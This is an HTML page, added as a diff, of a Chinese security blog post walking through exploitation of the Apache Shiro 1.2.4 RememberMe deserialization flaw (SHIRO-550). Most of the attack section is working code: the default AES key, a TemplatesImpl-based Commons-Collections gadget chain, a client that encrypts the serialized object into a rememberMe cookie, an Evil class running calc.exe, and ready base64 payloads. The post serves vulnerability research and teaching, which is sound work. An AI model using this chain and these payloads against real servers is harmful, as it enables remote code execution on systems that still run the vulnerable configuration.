@@ -1,0 +1,542 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TemplatesImpl在Shiro中的利用 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="TemplatesImpl在Shiro中的利用 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+前面学习了CC1、CC3和CC6，其中CC6是不限制版本的一条链，那么为什么还要用到TemplatesImpl这条链呢?不妨我们设想一下:命令执行和代码执行到底谁更有价值?
+例如在PHP中会遇到一个场景，call_user_func和..." />
+    <meta name="keywords" content="Java,反序列化,Shiro,Commons-Collections" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              TemplatesImpl在Shiro中的利用
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-17
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://le1a.github.io/tag/u4AbpM3qf1/" class="post-tag">
+                  # Shiro
+                </a>
+              
+                <a href="https://le1a.github.io/tag/aOuH92_N0LX/" class="post-tag">
+                  # Commons-Collections
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>前面学习了CC1、CC3和CC6，其中CC6是不限制版本的一条链，那么为什么还要用到TemplatesImpl这条链呢?不妨我们设想一下:<code>命令执行</code>和<code>代码执行</code>到底谁更有价值?</p>
+<p>例如在PHP中会遇到一个场景，<code>call_user_func</code>和<code>eval</code>都能造成的代码执行，而更多的人愿意使用<code>eval</code>，原因是<code>call_user_func</code>在某种情况下会被限制不能使用<code>assert</code>和<code>system</code>函数。通过<code>TemplatesImpl</code>构造的利用链，理论上可以执行任意Java代码。</p>
+<h2 id="shiro反序列化原理">Shiro反序列化原理</h2>
+<p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。<br>
+Shiro 1.2.4版本默认固定密钥：<code>kPH+bIxk5D2deZiIxcaaaA==</code><br>
+<img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/6a229b47a3ad8.png" alt="1647518003650.png" loading="lazy"></p>
+<h2 id="影响版本">影响版本</h2>
+<p>Shiro 1.2.4及之前的版本中，AES加密的密钥默认硬编码在代码里（SHIRO-550），Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+<h2 id="漏洞环境搭建">漏洞环境搭建</h2>
+<p>漏洞环境: <a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">点击访问</a></p>
+<p>搭建教程: <a href="https://blog.csdn.net/qq_47886905/article/details/123479769?spm=1001.2014.3001.5502">点击访问</a></p>
+<p>访问首页，如图所示即已搭建成功</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/03ff8509d25a6.png" alt="1647518368284.png" loading="lazy"></figure>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>先添加一波依赖:</p>
+<pre><code class="language-XML">&lt;dependency&gt;
+      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;
+      &lt;version&gt;1.2.4&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+      &lt;version&gt;3.27.0-GA&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/3e678b5bc4d78.png" alt="1647518549601.png" loading="lazy"></figure>
+<p>先登录抓包一下，使用<code>root/secret</code>登录并勾选Remember Me。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/e4773cf7b4b51.png" alt="1647518795034.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/72d6ed572fc57.png" alt="1647518868766.png" loading="lazy"></figure>
+<p>勾选登录后，Cookie会生成rememberMe字段，这条链子的一个攻击流程就是:</p>
+<ol>
+<li>CC链生成payload</li>
+<li>使用Shiro默认密钥进行AES加密</li>
+<li>进行Base64编码</li>
+<li>传入Cookie中的remember字段发送给服务器，最后进行反序列化</li>
+</ol>
+<p>不过这里的CC链需要改造CC6才能打，我们先直接来打，看看是什么效果捏?</p>
+<pre><code class="language-java">package Shiro;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class CommonsCollections6 {
+    public static byte[] getPayload(String command) throws Exception {
+        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class,
+                        Class[].class }, new Object[] { &quot;getRuntime&quot;,
+                        new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class,
+                        Object[].class }, new Object[] { null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class },
+                        new String[] { command }),
+                new ConstantTransformer(1),
+        };
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+
+        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;valuevalue&quot;);
+
+        outerMap.remove(&quot;keykey&quot;);
+
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+}
+</code></pre>
+<pre><code class="language-java">package Shiro;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+public class Client {
+    public static void main(String[] args) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Shiro.Evil.class.getName());
+        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+
+    }
+}
+</code></pre>
+<p>加密的过程，我直接使用的shiro内置的类<code>org.apache.shiro.crypto.AesCipherService</code>，最后生成一段base64字符串:</p>
+<pre><code>8hUffthcUeeLkklAI0FNJwESbBbDgOXdmJZgVFIT091XnNe8AOefNV7cz1O+X4eHMxpoy0Yzl4Kd4QNpXNf97iBIBmwtdH5ld15SJBREX947DUjYxeG2byCRGHkrYvR+7qpx+d8wXQoK1lspXdu3r795ezC/xC0WbmZxxxvrXdRN+BuJr9aiO74mjGB01DkIJUPcoUkVyYawR1uvhpWJQTQzIoLCkySrElzp7SHMxivFl5QMer/ZOwNjhXRWzbrL9nuWrWve9ZCvkhKEAARINETCy40jzHa4zoKoGlZN1wEfqX39eAQ9Onh5GKMc/MM1He/PQEgOt8LykMiJjBs6aoYVjRl4KOgr3M940sJNTJjFOVPtnf1NK3mMqzy2zB5jn1RMkG9L0VIwo1OXcGSlJOftS1V2b+sBjCD3NwqCBAbXrluTxrFz4umWdb+SqQtSC5162IwLVL+Zbmgj/ygXYvTFUvrgf8DpYhT8t4KvJxYKT/vNfdukWhe1NRWUGKmrT3n7s/L7l6+h82bLkf6XxW38mHliDcCuVbTi8qQW4qGdp3c5CfBF6vWbSlsv7904KuUXhSyaiJCpyLuPKcG0AB4B4Rk/9zQ9iq/IAA7g/r/z3KhvonSZXAm75xoqpV8UAjx+LHi9e/lbYvaOOi9EqxWZVEVdXU8Nac3IOSeW9OydVl1ICHb2LLOS2I8wY3TlZRnJPj7CS+KkT6R4NW9IidzKju1PXgcU1QlKjcfQ90CeWclI+zFVCbIxQY4khNkPYjBzTdTitAV0Uvd/76Su9CDlfVaMAtNDJ9omivf4Lb4UiQCmz8lUfSQFhvK5FYqZi28v+Y18WlOls8lS0YdsnCpvVThwg3MkQKJfBCkKx3Fj5kqn1j2jCcdp24RZ5Vqov7urUli3hXL2I7fekicuDwgyq3defCQ+uIRhAzFYxwejKKJgvOLyPHLpJh5aPPR2UD7DdR3sDY3yjg1Gb3grg+9hnRJ6YQ92EJLt5migQxLWOQK12kFBbWn01zIFWWJweWDtYUzhsV13UDuMg774rrD0PawLSi9f+zlVqJBsuAxoTDE/g1sBD1Vg8IcJI1L6BFdLn8gANeFlGFjoYTfBTcfbl6DRCGAw3RPOPBohQhwuCLyZKNdPVCzZjlHg2NEND4DRZItLfLEjYXUz/M91eX3ifiHVHlkG8UrpeqjH/z5a5ZjoO0N+Aq7aF+f7mxVTYf+ppvVPWO7OniM/7xntaU7SeX1NMku8XsnBwNUf02ibLCIbHgdZX2rJdHWuxn7AXUAJ//W4xIGgYn6mX3/lCnaqNxwwjFudwho55aowtBunUUX+yE3ZZxTEjAQHfcML2idFerDOBYxdcfLcwmS/XEklmf2chX5odNg179dJglwzKjGwJVij9ZWhuu6r4eqQ5WF/9dc2wNXDQzJ9R1Nv1ylMgtRpOka1XUVY7VK1Qv1q0gdHeuvDhmwQn+tCh5C+pBkzA+O0JokZEGUjOksi1DIKCJBbuNCJB8m+vTgl/coJ5vVTR0p58u0gdmlpUMSPy+Z8PEvBxL9erE1YUvQYkD5d3rGqC2ZHldMKhv668ru3DvtiqVfg3nm7d1QHRPqeBz3HU2qNUVvgJGqihwu9O9m2AWLQ6bLKBneRt7P3vH/hRM7ZW2ZTkC+0XBMKiMYfRrcMlF5u4gvLkP9REaYAVgPwWHV7C86sncQFzQdNh+sPoyRVVBZYV832Ay7xzWJc
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/b03bc48c50399.png" alt="1647519709045.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/752b08e168bf7.png" alt="1647519782887.png" loading="lazy"></figure>
+<p>可以看到，是没有成功弹出计算器的，我们来思考一下为什么呢?</p>
+<blockquote>
+<p><strong>P牛在其Java安全漫谈中给出了答案: 如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</strong></p>
+</blockquote>
+<h3 id="构造不含数组的反序列化gadget">构造不含数组的反序列化Gadget</h3>
+<p>接下来，看看如何使用<code>TemplatesImpl</code>来改造CC6。<a href="https://www.le1a.com/posts/7a3550f3/">CC6分析传送门</a>首先可以通过下面这几行代码来执行一段Java的字节码</p>
+<pre><code class="language-java">TemplatesImpl obj = new TemplatesImpl();
+setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {&quot;...bytescode&quot;});
+setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+obj.newTransformer();
+</code></pre>
+<p>而在CC3中介绍了，利用<code> InvokerTransformer</code> 调用 <code>TemplatesImpl#newTransformer</code> 方法：</p>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(obj),
+    new InvokerTransformer(&quot;newTransformer&quot;, null, null)
+};
+</code></pre>
+<p>但是这里仍然是用到了<code>Transformer[]</code>，所以还算不满足条件。</p>
+<p>在<code>CommonsCollections6</code>中使用了<code>TiedMapEntry</code>这个类，它的构造函数接受了两个参数，一个是Map，一个是对象Key。<code>TiedMapEntry</code>类有个<code>getValue</code>调用了map的get方法，并传入key。</p>
+<pre><code class="language-java">public Object getValue() {
+    return map.get(key);
+}
+</code></pre>
+<p>当这个map被传入LazyMap的时候，其get方法就触发了transform()方法。</p>
+<pre><code class="language-java">public Object get(Object key) {
+    // create value for key if key is not currently in the map
+    if (map.containsKey(key) == false) {
+        Object value = factory.transform(key);
+        map.put(key, value);
+        return value;
+    }
+    return map.get(key);
+}
+</code></pre>
+<p>在以前构造CC6的时候，这里参数key的值实际上是可以随意设置的，因为Transformer[]数组的首个对象是ConstantTransformer，我们是通过ConstantTransformer来初始化恶意对象。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/f14d45d23def3.png" alt="1647521620469.png" loading="lazy"></figure>
+<p>但是现在不能使用Transformer[]数组了，自然也就不能使用ConstantTransformer了。但是此时这个<code>LazyMap#get</code> 的参数key却让人引起重视，因为这个key会被传入transform()，也就是它也能扮演ConstantTransformer的角色，用来传递恶意对象。</p>
+<h3 id="改造commonscollections6为-commonscollectionsshiro">改造CommonsCollections6为 CommonsCollectionsShiro</h3>
+<p>首先第一步还算使用<code>TemplatesImpl</code>对象:</p>
+<pre><code class="language-java">TemplatesImpl obj = new TemplatesImpl();
+setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {&quot;...bytescode&quot;});
+setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+</code></pre>
+<p>然后用newTransformer方法的InvokerTransformer，但此时先构造一个fake，防止恶意方法在构造链子的时候触发:</p>
+<pre><code class="language-java">Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);
+</code></pre>
+<p>然后下面就继续用CC6的代码，在TiedMapEntry构造的时候，第二个参数key传入刚刚创建的<code>TemplatesImpl</code>对象:</p>
+<pre><code class="language-java">Map innerMap = new HashMap();
+Map outerMap = LazyMap.decorate(innerMap, transformer);
+TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
+Map expMap = new HashMap();
+expMap.put(tme, &quot;valuevalue&quot;);
+outerMap.clear();
+</code></pre>
+<p>之前使用的<code>outerMap.remove</code>来移除<code>keykey</code>这个值，这里可以用过 <code>outerMap.clear()</code>效果是一样的。</p>
+<p>最后，将 <code>InvokerTransformer</code> 的方法从人畜无害的 <code>getClass</code> ，改成 <code>newTransformer</code>(用于初始化，触发恶意类的构造函数)</p>
+<h3 id="完整commonscollectionsshiro">完整CommonsCollectionsShiro:</h3>
+<pre><code class="language-java">package Shiro;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollectionsShiro {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{clazzBytes});
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);
+
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformer);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;valuevalue&quot;);
+
+        outerMap.clear();
+        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+}
+</code></pre>
+<h3 id="写一个clientjava来配合链子生成payload">写一个Client.java来配合链子生成payload:</h3>
+<pre><code class="language-java">package Shiro;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+public class Client {
+    public static void main(String[] args) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Shiro.Evil.class.getName());
+        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+
+    }
+}
+</code></pre>
+<h3 id="evil类">Evil类</h3>
+<p>还有一个Evil类，用到了<code>javassist</code>，它是一个字节码操纵的第三方库，可以帮助我们把恶意类转化为字节码文件，再传入<code>TemplatesImpl</code>进行类加载。</p>
+<pre><code class="language-java">package Shiro;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Evil extends AbstractTranslet {
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+
+    public Evil() throws Exception {
+        super();
+        System.out.println(&quot;Hello TemplatesImpl&quot;);
+        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+    }
+}
+</code></pre>
+<h3 id="payload">Payload:</h3>
+<pre><code>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
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/17/98f9f51f484b1.png" alt="1647526673995.png" loading="lazy"></figure>
+<h2 id="最后">最后</h2>
+<ul>
+<li>
+<p>Shiro不是遇到Tomcat就一定会有数组这个问题</p>
+</li>
+<li>
+<p>Shiro-550的修复并不意味着反序列化漏洞的修复，只是默认Key被移除了，还有新的Shiro721</p>
+</li>
+<li>
+<p>Shiro550使用已知密钥撞，Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化，对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）</p>
+</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86">Shiro反序列化原理</a></li>
+<li><a href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">影响版本</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">漏洞环境搭建</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
+<ul>
+<li><a href="#%E6%9E%84%E9%80%A0%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget">构造不含数组的反序列化Gadget</a></li>
+<li><a href="#%E6%94%B9%E9%80%A0commonscollections6%E4%B8%BA-commonscollectionsshiro">改造CommonsCollections6为 CommonsCollectionsShiro</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4commonscollectionsshiro">完整CommonsCollectionsShiro:</a></li>
+<li><a href="#%E5%86%99%E4%B8%80%E4%B8%AAclientjava%E6%9D%A5%E9%85%8D%E5%90%88%E9%93%BE%E5%AD%90%E7%94%9F%E6%88%90payload">写一个Client.java来配合链子生成payload:</a></li>
+<li><a href="#evil%E7%B1%BB">Evil类</a></li>
+<li><a href="#payload">Payload:</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9C%80%E5%90%8E">最后</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Commons-Collections3/">
+              <h3 class="post-title">
+                Commons-Collections3
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
